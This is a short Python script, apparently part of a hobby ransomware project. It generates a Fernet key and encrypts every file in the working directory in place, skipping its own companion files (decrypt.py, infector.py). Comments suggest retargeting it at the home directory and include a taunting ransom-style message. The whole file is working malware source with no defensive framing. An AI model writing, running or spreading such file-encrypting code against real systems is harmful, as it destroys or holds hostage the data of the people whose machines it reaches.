import os
from cryptography.fernet import Fernet

files = []
key = Fernet.generate_key()
with open('f_key.key','wb') as f_key:
    f_key.write(key)
# print('your data has now been encrypted hahahaha')

# if you are really feelin it use the following to go to the main directory
# directory = os.path.expanduser('~')


for file in os.listdir():
    if file == '.DS_Store' or file == 'f_key.key' or os.path.isfile(file) == False or file == 'encrypt.py' or file == 'decrypt.py' or file == 'infector.py' or file == "infector_next_folder.py" :
        continue

    files.append(file)
# print(files)
for file in files:
    with open(file, 'rb') as thefile:
        contents = thefile.read()
        contents_encrypted =  Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)



# print(key)
